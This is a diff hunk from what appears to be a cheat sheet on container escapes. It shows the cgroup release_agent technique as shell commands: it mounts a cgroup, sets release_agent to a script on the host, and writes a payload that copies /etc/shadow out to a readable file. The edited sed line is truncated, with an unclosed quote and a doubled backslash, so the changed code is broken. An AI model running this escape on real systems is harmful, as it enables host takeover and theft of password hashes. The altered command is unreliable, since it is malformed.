@@ -1023,7 +1023,7 @@ cat /proc/self/status | grep CapEff
 # Exploit cgroup release_agent:
 mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+host_path=$(sed -n 's/.*\\perdir=\([^,]*\).*
 echo "$host_path/exploit" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /exploit
 echo "cat /etc/shadow > $host_path/output" >> /exploit
